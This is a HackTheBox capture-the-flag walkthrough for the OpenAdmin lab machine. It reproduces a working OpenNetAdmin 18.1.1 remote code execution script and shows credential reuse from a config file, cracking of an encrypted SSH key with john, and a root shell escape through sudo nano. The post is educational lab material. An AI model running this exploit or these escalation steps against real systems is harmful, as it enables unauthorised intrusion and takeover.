---
layout: post
title:  "OpenAdmin Walkthrough!"
categories: HackTheBox
---

# OpenAdmin Walkthrough

## Enumeration

### nmap

```
# Nmap 7.80 scan initiated Fri Apr 24 18:56:13 2020 as: nmap -sC -sV -oA openadmin 10.10.10.171
Nmap scan report for 10.10.10.171
Host is up (0.69s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)
|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)
|_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)
80/tcp   open  http       Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
8000/tcp open  tcpwrapped
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Apr 24 18:58:43 2020 -- 1 IP address (1 host up) scanned in 150.61 seconds
```

The nmap scan has shown that both a webpage and ssh are open. I'm guessing the box wants us to find something on the website to allow us to ssh into a user.

### gobuster

```
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.171
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/04/29 20:24:10 Starting gobuster
===============================================================
/music (Status: 301)
/artwork (Status: 301)
/sierra (Status: 301)
/server-status (Status: 403)
===============================================================
2020/04/29 20:37:11 Finished
===============================================================
```

Upon visiting the page we see the default Apache2 page
![Apache2 Ubuntu default page](../assets/images/openadmin/apache.png)

Upon navigating to http://10.10.10.171/music we get to the website advertising a music streaming service 
![navigated to /music](../assets/images/openadmin/music.png)

clicking around on the page, clicking on login takes me to a strange redirect.
![redirect after clicking login](../assets/images/openadmin/ona.png)

Looks like OpenNetAdmin is outdated so ill serach on exploitDB to see if there is anything we can use
![ExploitDB search](../assets/images/openadmin/exploitsearch.png)

## Exploit

From the two results in ExploitDB, I'm going to choose to use the remote code execution vulnerability. Lets take a look at that below.

![Exploit header](../assets/images/openadmin/exploitheader.png)


```bash
# Exploit Title: OpenNetAdmin 18.1.1 - Remote Code Execution
# Date: 2019-11-19
# Exploit Author: mattpascoe
# Vendor Homepage: http://opennetadmin.com/
# Software Link: https://github.com/opennetadmin/ona
# Version: v18.1.1
# Tested on: Linux

#!/bin/bash

URL="${1}"
while true;do
 echo -n "$ "; read cmd
 curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";${cmd};echo \"END\"&xajaxargs[]=ping" "${URL}" | sed -n -e '/BEGIN/,/END/ p' | tail -n +2 | head -n -1
done
```

I ran this exploit against the box by copying the code to a file (I called mine exploit.sh), making it executable by doing:

`chmod +x exploit.sh`

and then executing it using: 

`bash exploit.sh http://10.10.10.171/ona/`

this gives us a shell as www-data

```
$ whoami
www-data
$ ls -la
total 72
drwxrwxr-x 10 www-data www-data 4096 Nov 22 17:17 .
drwxr-x---  7 www-data www-data 4096 Nov 21 18:23 ..
-rw-rw-r--  1 www-data www-data 1970 Jan  3  2018 .htaccess.example
drwxrwxr-x  2 www-data www-data 4096 Jan  3  2018 config
-rw-rw-r--  1 www-data www-data 1949 Jan  3  2018 config_dnld.php
-rw-rw-r--  1 www-data www-data 4160 Jan  3  2018 dcm.php
drwxrwxr-x  3 www-data www-data 4096 Jan  3  2018 images
drwxrwxr-x  9 www-data www-data 4096 Jan  3  2018 include
-rw-rw-r--  1 www-data www-data 1999 Jan  3  2018 index.php
drwxrwxr-x  5 www-data www-data 4096 Jan  3  2018 local
-rw-rw-r--  1 www-data www-data 4526 Jan  3  2018 login.php
-rw-rw-r--  1 www-data www-data 1106 Jan  3  2018 logout.php
drwxrwxr-x  3 www-data www-data 4096 Jan  3  2018 modules
drwxrwxr-x  3 www-data www-data 4096 Jan  3  2018 plugins
drwxrwxr-x  2 www-data www-data 4096 Jan  3  2018 winc
drwxrwxr-x  3 www-data www-data 4096 Jan  3  2018 workspace_plugins
```

### User Enumeration

```
$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
jimmy:x:1000:1000:jimmy:/home/jimmy:/bin/bash
mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false
joanna:x:1001:1001:,,,:/home/joanna:/bin/bash
```

Things to note from this are the Jimmy and Joanna users we are going to want to pivot onto. This means we are going to need to find some credentials.

`$ find / -type f -user www-data`

this dumps a very long list of files which the user www-data can read. I chose to copy this into a text file so i can go through it. (I won't inlcude it here since its 2000 lines long).

the most interesting directory I found was `/opt/ona/www/local/config`
Within this directory i saw the file `database_settings.inc.php`


`$ cat /opt/ona/www/local/config/database_settings.inc.php`

```
$ona_contexts=array (
  'DEFAULT' => 
  array (
    'databases' => 
    array (
      0 => 
      array (
        'db_type' => 'mysqli',
        'db_host' => 'localhost',
        'db_login' => 'ona_sys',
        'db_passwd' => 'n1nj4W4rri0R!',
        'db_database' => 'ona_default',
        'db_debug' => false,
      ),
    ),
    'description' => 'Default data context',
    'context_color' => '#D3DBFF',
  ),
);
```

upon opening the file we get our first password. From /ect/passwd we can see mysql is set to bin/false so I won't try to login to that.

## User 1 (Jimmy)

Using ssh I was able to connect to Jimmys account using `jimmy:n1nj4W4rri0R!`

```
ssh jimmy@10.10.10.171
jimmy@10.10.10.171's password: 
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Apr 29 20:34:36 UTC 2020

  System load:  0.07              Processes:             141
  Usage of /:   49.6% of 7.81GB   Users logged in:       2
  Memory usage: 28%               IP address for ens160: 10.10.10.171
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

41 packages can be updated.
12 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Wed Apr 29 20:29:04 2020 from 10.10.15.0
jimmy@openadmin:~$ 
```

again im going to enumerate all the files i can now read as Jimmy using `find / -type f -user jimmy 2>/dev/null | grep -v "/proc/"`.

This shows three interesting files:

```
...
/var/www/internal/main.php
/var/www/internal/logout.php
/var/www/internal/index.php
...
```

inside the index.php file we find more credentials

```
$msg = '';

if (isset($_POST['login']) && !empty($_POST['username']) && !empty($_POST['password'])) {
  if ($_POST['username'] == 'jimmy' && hash('sha512',$_POST['password']) == '00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1') {
      $_SESSION['username'] = 'jimmy';
      header("Location: /main.php");
  } else {
      $msg = 'Wrong username or password.';
  }
}
```
Analysing this hash we see its sha512.
`00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1`

After running this through john, i wasn't able to get a password so maybe there's another way to do this.

looking at main.php, I see if we can somehow access this page, we get Joanna's ssh key.
```
jimmy@openadmin:~$ cat /var/www/internal/main.php
<?php session_start(); if (!isset ($_SESSION['username'])) { header("Location: /index.php"); }; 
# Open Admin Trusted
# OpenAdmin
$output = shell_exec('cat /home/joanna/.ssh/id_rsa');
echo "<pre>$output</pre>";
?>
<html>
<h3>Don't forget your "ninja" password</h3>
Click here to logout <a href="logout.php" tite = "Logout">Session
</html>
```

doing `netstat -tulv` shows port 52846 is listening. the -t & -u mean we are specifying tcp and upd, the -l shows us only addresses which are listening, and finally the -v stands for verbose so we get as much information about them as possible. 
```
jimmy@openadmin:~$ netstat -tulv
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 localhost:mysql         0.0.0.0:*               LISTEN     
tcp        0      0 localhost:52846         0.0.0.0:*               LISTEN     
tcp        0      0 localhost:domain        0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:ssh             0.0.0.0:*               LISTEN     
tcp6       0      0 [::]:http               [::]:*                  LISTEN     
tcp6       0      0 [::]:ssh                [::]:*                  LISTEN     
udp        0      0 localhost:domain        0.0.0.0:*                          
jimmy@openadmin:~$ 
```

doing `curl 127.0.0.1:52846` gave me the login page (without the exposted credentials again)

however, if i do `curl 127.0.0.1:52846/main.php` we get Joanna's ssh key

```
jimmy@openadmin:~$ curl 127.0.0.1:52846/main.php
<pre>-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,2AF25344B8391A25A9B318F3FD767D6D

kG0UYIcGyaxupjQqaS2e1HqbhwRLlNctW2HfJeaKUjWZH4usiD9AtTnIKVUOpZN8
ad/StMWJ+MkQ5MnAMJglQeUbRxcBP6++Hh251jMcg8ygYcx1UMD03ZjaRuwcf0YO
ShNbbx8Euvr2agjbF+ytimDyWhoJXU+UpTD58L+SIsZzal9U8f+Txhgq9K2KQHBE
6xaubNKhDJKs/6YJVEHtYyFbYSbtYt4lsoAyM8w+pTPVa3LRWnGykVR5g79b7lsJ
ZnEPK07fJk8JCdb0wPnLNy9LsyNxXRfV3tX4MRcjOXYZnG2Gv8KEIeIXzNiD5/Du
y8byJ/3I3/EsqHphIHgD3UfvHy9naXc/nLUup7s0+WAZ4AUx/MJnJV2nN8o69JyI
9z7V9E4q/aKCh/xpJmYLj7AmdVd4DlO0ByVdy0SJkRXFaAiSVNQJY8hRHzSS7+k4
piC96HnJU+Z8+1XbvzR93Wd3klRMO7EesIQ5KKNNU8PpT+0lv/dEVEppvIDE/8h/
/U1cPvX9Aci0EUys3naB6pVW8i/IY9B6Dx6W4JnnSUFsyhR63WNusk9QgvkiTikH
40ZNca5xHPij8hvUR2v5jGM/8bvr/7QtJFRCmMkYp7FMUB0sQ1NLhCjTTVAFN/AZ
fnWkJ5u+To0qzuPBWGpZsoZx5AbA4Xi00pqqekeLAli95mKKPecjUgpm+wsx8epb
9FtpP4aNR8LYlpKSDiiYzNiXEMQiJ9MSk9na10B5FFPsjr+yYEfMylPgogDpES80
X1VZ+N7S8ZP+7djB22vQ+/pUQap3PdXEpg3v6S4bfXkYKvFkcocqs8IivdK1+UFg
S33lgrCM4/ZjXYP2bpuE5v6dPq+hZvnmKkzcmT1C7YwK1XEyBan8flvIey/ur/4F
FnonsEl16TZvolSt9RH/19B7wfUHXXCyp9sG8iJGklZvteiJDG45A4eHhz8hxSzh
Th5w5guPynFv610HJ6wcNVz2MyJsmTyi8WuVxZs8wxrH9kEzXYD/GtPmcviGCexa
RTKYbgVn4WkJQYncyC0R1Gv3O8bEigX4SYKqIitMDnixjM6xU0URbnT1+8VdQH7Z
uhJVn1fzdRKZhWWlT+d+oqIiSrvd6nWhttoJrjrAQ7YWGAm2MBdGA/MxlYJ9FNDr
1kxuSODQNGtGnWZPieLvDkwotqZKzdOg7fimGRWiRv6yXo5ps3EJFuSU1fSCv2q2
XGdfc8ObLC7s3KZwkYjG82tjMZU+P5PifJh6N0PqpxUCxDqAfY+RzcTcM/SLhS79
yPzCZH8uWIrjaNaZmDSPC/z+bWWJKuu4Y1GCXCqkWvwuaGmYeEnXDOxGupUchkrM
+4R21WQ+eSaULd2PDzLClmYrplnpmbD7C7/ee6KDTl7JMdV25DM9a16JYOneRtMt
qlNgzj0Na4ZNMyRAHEl1SF8a72umGO2xLWebDoYf5VSSSZYtCNJdwt3lF7I8+adt
z0glMMmjR2L5c2HdlTUt5MgiY8+qkHlsL6M91c4diJoEXVh+8YpblAoogOHHBlQe
K1I1cqiDbVE/bmiERK+G4rqa0t7VQN6t2VWetWrGb+Ahw/iMKhpITWLWApA3k9EN
-----END RSA PRIVATE KEY-----
</pre><html>
<h3>Don't forget your "ninja" password</h3>
Click here to logout <a href="logout.php" tite = "Logout">Session
</html>
jimmy@openadmin:~$ 
```

As this is encrypted, we are going have to decrypt it. 
First i used installed ssh2john 
```
sudo apt-get install ssh2john
/usr/share/john/ssh2john.py id_rsa.hash > crack.hash
john --wordlist=/usr/share/wordlists/rockyou.txt crack.hash
```
then ran john against the hash.
```
Using default input encoding: UTF-8                                                                                        
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])        
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads                                                                                                  
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.                                                                                              
Press 'q' or Ctrl-C to abort, almost any other key for status 
bloodninjas      (id_rsa.hash)                                                                                             
Warning: Only 2 candidates left, minimum 4 needed for performance.                         
1g 0:00:00:02 DONE (2020-04-29 22:18) 0.3759g/s 5391Kp/s 5391Kc/s 5391KC/sa6_123..*7¡Vamos!
Session completed
```

we now have the login for joanna.

## User 2 (Joanna)

```
kali@kali:~/HackTheBox/openadmin/keys$ ssh -i joanna joanna@10.10.10.171
Enter passphrase for key 'joanna': 
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Apr 29 21:28:16 UTC 2020

  System load:  0.05              Processes:             155
  Usage of /:   50.2% of 7.81GB   Users logged in:       2
  Memory usage: 31%               IP address for ens160: 10.10.10.171
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

41 packages can be updated.
12 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Wed Apr 29 21:21:22 2020 from 10.10.15.226
joanna@openadmin:~$ 
```
The user flag for this box is found in her directory so we can have a look at that now 
```
joanna@openadmin:~$ wc -c user.txt 
33 user.txt
joanna@openadmin:~$ 
```

## Root.txt

To escalate up to root we can start by seeing if there are any root commands we can execure from joanna

```
joanna@openadmin:~$ sudo -l
Matching Defaults entries for joanna on openadmin:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User joanna may run the following commands on openadmin:
    (ALL) NOPASSWD: /bin/nano /opt/priv
joanna@openadmin:~$ 
```

As we can see, nano can be run as root.

to open nano as root i did `sudo -u root nano /opt/priv`. I then did ctrl + R to read from a file. and there i was able to read root.txt.

Alternativly you can do `ctrl + r` `ctrl + x` to execute a command as root. to get a shell i executed `reset; sh 1>&0 2>&0` and was then able to see the root file after navigating my shell to root.

```
# ls
root.txt
# wc -c root.txt
33 root.txt
#                    
```
